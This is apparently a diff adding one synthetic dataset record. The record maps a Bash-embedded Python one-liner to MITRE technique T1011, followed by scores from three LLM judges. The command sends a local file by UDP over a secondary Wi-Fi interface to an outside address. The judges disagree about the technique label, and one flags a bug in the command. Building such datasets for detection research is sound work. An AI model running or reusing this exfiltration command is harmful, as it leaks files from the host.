@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "IF=wlan2; iwconfig \"$IF\" >/dev/null 2>&1 && python3 -c 'import os,sys,socket,subprocess; iface=os.environ[\"IF\"]; src=subprocess.check_output(\"ip -4 -o addr show \"+iface, shell=True).decode().split()[3].split(\"/\")[0]; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.bind((src,0)); s.sendto(open(sys.argv[1],\"rb\").read(), (sys.argv[2], int(sys.argv[3])))' /home/user/.local/state/cache.idx 10.55.88.11 49537",
+  "explanation": "Executes a Python UDP sender bound to the wlan2 source IP after validating the interface with iwconfig, representing exfiltration over a distinct Wi\u2011Fi medium per T1011.",
+  "rationale_steps": [
+    "Use iwconfig to validate the secondary Wi\u2011Fi interface.",
+    "Programmatically discover wlan2\u2019s IP and bind the socket to that source.",
+    "Send the file via UDP on a high, uncommon port to avoid default routes."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-073fc4d7",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flag formats, and correct Python syntax within the embedded script.",
+        "semantic_score": 4,
+        "semantic_justification": "The command correctly implements data exfiltration via UDP over a wireless interface (wlan2) which aligns with T1011, but the technique ID T1011 actually refers to 'Exfiltration Over Other Network Medium' rather than 'Establish Accounts' as described in the prompt.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T09:18:24.448186Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct variable assignment, command chaining, quoting, redirections, and valid Python syntax for its operations.",
+        "semantic_score": 0,
+        "semantic_justification": "The command describes a file exfiltration via UDP, which is entirely unrelated to MITRE ATT&CK Technique T1011 'Establish Accounts', making the claim 'per T1011' semantically incorrect.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T09:18:39.322115Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, valid redirections, and correct Bash/Python invocation syntax.",
+        "semantic_score": 1,
+        "semantic_justification": "It attempts UDP file exfiltration rather than establishing accounts per the provided technique description and likely fails due to the unexported IF variable not being available to Python.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T09:18:59.947371Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
